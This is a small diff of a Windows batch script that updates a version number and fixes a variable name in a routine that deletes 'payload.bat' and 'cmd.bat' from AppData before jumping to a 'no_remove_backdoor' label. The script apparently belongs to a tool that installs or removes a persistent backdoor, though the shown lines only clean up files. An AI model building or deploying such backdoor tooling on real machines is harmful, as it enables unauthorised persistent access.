@@ -1,7 +1,7 @@
 :: setup
 :start
 @echo off
-set update_number=V2.24.17
+set update_number=V2.24.18
 set dev=0
 set temp=0 & set payload_is_exist=0 & set cmd_is_exist=0
 color 0F
@@ -257,7 +257,7 @@ if not exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\P
 if %payload_is_exist% equ 1 del "C:\users\%username%\AppData\payload.bat"
 if %payload_is_exist% equ 1 (echo [92mpayload.bat removed[0m)
 if %cmd_is_exist% equ 1 (del "C:\users\%username%\AppData\cmd.bat")
-if %cmdload_is_exist% equ 1 (echo [92mcmd.bat removed[0m)
+if %cmd_is_exist% equ 1 (echo [92mcmd.bat removed[0m)
 timeout 1 /NOBREAK >nul
 cls
 goto no_remove_backdoor
